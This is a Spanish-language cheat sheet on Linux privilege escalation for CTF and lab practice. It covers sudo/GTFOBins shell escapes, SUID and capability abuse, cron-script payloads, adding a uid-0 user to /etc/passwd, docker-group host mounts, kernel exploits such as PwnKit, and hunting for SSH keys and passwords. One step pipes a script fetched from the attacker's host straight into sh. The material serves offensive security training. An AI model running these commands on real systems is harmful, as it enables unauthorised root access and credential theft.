# Escalada de Privilegios en Linux

Ya tienes una shell como usuario sin privilegios. El objetivo ahora es llegar a **root**. La escalada en Linux es, en el 90 % de los casos, un problema de **enumeración**: la vía casi siempre está delante de ti, solo hay que encontrarla.

> **Lo primero, siempre:** [estabiliza la shell](../T%C3%A9cnicas%20de%20Hacking%20Fundamentales/Netcat.md) (TTY) y lanza un script de enumeración automática (`linpeas.sh`) **mientras** revisas a mano las vías rápidas de abajo.

---

## Enumeración inicial

```bash
id                      # mis grupos (docker, lxd, disk, sudo... son vías directas)
whoami
sudo -l                 # ¡LO PRIMERO! qué puedo ejecutar como root
uname -a                # versión del kernel
cat /etc/os-release     # distribución y versión
hostname -I
```

Enumeración automática (descarga desde tu máquina y ejecuta):

```bash
# En tu máquina: python3 -m http.server 80  (sirviendo linpeas.sh)
curl http://<TU_IP>/linpeas.sh | sh
# o
wget http://<TU_IP>/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh
```

> **linpeas** colorea en rojo/amarillo los hallazgos más prometedores. Pero no te fíes solo de él: repasa manualmente las vías de esta nota.

---

## Vía 1 — `sudo -l` (la reina)

Mira qué puedes ejecutar como root sin (o con) contraseña:

```bash
sudo -l
```

Si aparece **cualquier binario**, consúltalo en [**GTFOBins**](https://gtfobins.github.io/): casi todos tienen una forma de abrir una shell como root.

```bash
# Ejemplos clásicos de GTFOBins
sudo vim -c ':!/bin/sh'
sudo find . -exec /bin/sh \; -quit
sudo awk 'BEGIN {system("/bin/sh")}'
sudo less /etc/profile    # luego: !/bin/sh
sudo env /bin/sh
sudo python3 -c 'import os; os.system("/bin/sh")'
```

### Casos especiales de sudo

- **`(ALL) NOPASSWD: ALL`** → directamente `sudo su`.
- **`LD_PRELOAD` / `LD_LIBRARY_PATH` permitidos** (`env_keep`) → librería maliciosa.
- **`sudo` con wildcard** en un script → inyección de argumentos.
- **CVE-2021-3156 (Baron Samedit)** y **CVE-2019-14287** (`sudo -u#-1`) en versiones antiguas de sudo.

---

## Vía 2 — Binarios SUID

Binarios que se ejecutan con los permisos de su **dueño** (a menudo root):

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

Cada binario inusual en la lista → búscalo en [GTFOBins](https://gtfobins.github.io/) sección **SUID**.

```bash
# Ejemplos
./find . -exec /bin/sh -p \; -quit
./bash -p
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash   # si puedes crear SUID
```

> El flag `-p` en bash/dash es clave: conserva los privilegios del SUID (si no, los suelta).

---

## Vía 3 — Capabilities

Permisos "finos" que dan poderes de root a binarios concretos:

```bash
getcap -r / 2>/dev/null
```

La capability **`cap_setuid+ep`** es oro:

```bash
# Si python tiene cap_setuid
./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# Si perl la tiene
./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

Consulta GTFOBins sección **Capabilities**.

---

## Vía 4 — Tareas cron

Tareas programadas que corren como root. Si puedes **escribir** en el script que ejecutan o el PATH es abusable → RCE como root.

```bash
cat /etc/crontab
ls -la /etc/cron.*
cat /var/spool/cron/crontabs/* 2>/dev/null
```

Para pillar cron silenciosos, monitoriza procesos con **pspy** (no necesita root):

```bash
./pspy64
```

Si un cron ejecuta un script **escribible por ti**, mete tu payload:

```bash
echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' >> /ruta/script_escribible.sh
# espera a que el cron corra, luego:
/tmp/rb -p
```

---

## Vía 5 — Permisos de ficheros débiles

```bash
# Ficheros escribibles por todos
find / -writable -type f 2>/dev/null | grep -v '/proc'
# ¿Puedo escribir en /etc/passwd o /etc/shadow?
ls -la /etc/passwd /etc/shadow
```

Si `/etc/passwd` es escribible, añade un usuario root con contraseña conocida:

```bash
# Generar hash
openssl passwd -1 -salt hack 123456
# Añadir línea (uid 0)
echo 'hacker:$1$hack$...:0:0::/root:/bin/bash' >> /etc/passwd
su hacker   # contraseña: 123456
```

---

## Vía 6 — Grupos peligrosos

```bash
id
```

| Grupo | Vía de escalada |
| ----- | --------------- |
| `sudo` | `sudo -l` / `sudo su`. |
| `docker` | Montar el FS del host en un contenedor como root (ver abajo). |
| `lxd`/`lxc` | Crear un contenedor privilegiado que monte `/`. |
| `disk` | Leer/escribir el disco crudo con `debugfs` → leer `/etc/shadow`. |
| `adm` | Leer logs (a veces con credenciales). |
| `video`/`shadow` | Acceso a recursos sensibles según el caso. |

**Grupo `docker` → root instantáneo:**

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

## Vía 7 — Explotación del kernel

Último recurso (puede tumbar la máquina). Identifica versión y busca exploit:

```bash
uname -r
searchsploit linux kernel <versión>
```

Exploits famosos: **DirtyCow** (CVE-2016-5195), **Dirty Pipe** (CVE-2022-0847), **PwnKit / pkexec** (CVE-2021-4034, casi universal en su momento).

```bash
# PwnKit: muy fiable en sistemas sin parchear
./PwnKit
```

---

## Vía 8 — Credenciales y secretos

Busca contraseñas por todas partes:

```bash
cat ~/.bash_history ~/.*_history 2>/dev/null
grep -rniE 'password|passwd|secret|api_key' /var/www /opt /home 2>/dev/null
cat /etc/*.conf /opt/**/*.conf 2>/dev/null
find / -name '*.bak' -o -name '*.old' 2>/dev/null
cat ~/.ssh/id_rsa 2>/dev/null        # clave privada → SSH como ese usuario
mysql -u root -p   # reutiliza contraseñas encontradas
```

Reutiliza cualquier contraseña contra `su <usuario>`, SSH y servicios. **La reutilización de credenciales es la vía más común en labs.**

---

## Checklist de escalada Linux

- [ ] `sudo -l` → GTFOBins
- [ ] `id` → ¿grupo docker/lxd/disk/sudo?
- [ ] Binarios SUID (`find / -perm -4000`) → GTFOBins
- [ ] Capabilities (`getcap -r /`)
- [ ] Cron (`/etc/crontab`, pspy) → scripts escribibles
- [ ] Ficheros escribibles (`/etc/passwd`, scripts de servicios)
- [ ] Credenciales (history, configs, `.ssh`, código web)
- [ ] Servicios internos escuchando en `localhost` (`ss -tulpn`)
- [ ] Versión de kernel/sudo → exploits conocidos (PwnKit, DirtyPipe)

---

## Herramientas relacionadas

| Herramienta | Descripción |
| ----------- | ----------- |
| `linpeas.sh` | Enumeración automática de vías de escalada. |
| `pspy` | Ver procesos y cron sin ser root. |
| `GTFOBins` | Abuso de binarios legítimos (SUID/sudo/capabilities). |
| `LinEnum` / `linux-exploit-suggester` | Enumeración y sugerencia de exploits de kernel. |

---

> **Consejo:** sigue el checklist **en orden**. `sudo -l` y los SUID resuelven la mayoría de máquinas de nivel inicial/medio. Deja los exploits de kernel para el final: son ruidosos, poco fiables y pueden colgar la máquina. Y recuerda: tras conseguir root, recoge credenciales — te servirán para la siguiente máquina del lab.

---

## Dónde practicar la escalada en Linux

| Recurso | Tipo | Enlace |
| ------- | ---- | ------ |
| TryHackMe — "Linux PrivEsc" / "Linux PrivEsc Arena" | Salas guiadas | https://tryhackme.com |
| GTFOBins | Referencia de abuso de binarios | https://gtfobins.github.io |
| VulnHub / DockerLabs | Máquinas completas | https://www.vulnhub.com · https://dockerlabs.es |
| HTB — máquinas Linux retiradas | Online | https://www.hackthebox.com |

## Mini-writeup: escalada por sudo + GTFOBins

```flow
Enumerar :: sudo -l muestra un binario ejecutable como root sin contraseña.
Consultar :: Buscar ese binario en GTFOBins (sección sudo).
Explotar :: Ejecutar el payload de GTFOBins para abrir una shell root.
```

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/find
# GTFOBins -> find:
sudo find . -exec /bin/sh \; -quit
id   # uid=0(root)
```

> **Consejo:** monta una máquina de *Linux PrivEsc* de TryHackMe y practica **todas** las vías de la nota (sudo, SUID, capabilities, cron, grupos) en el mismo sistema. Repetir el checklist completo hasta hacerlo de memoria es lo que te da velocidad en el examen.
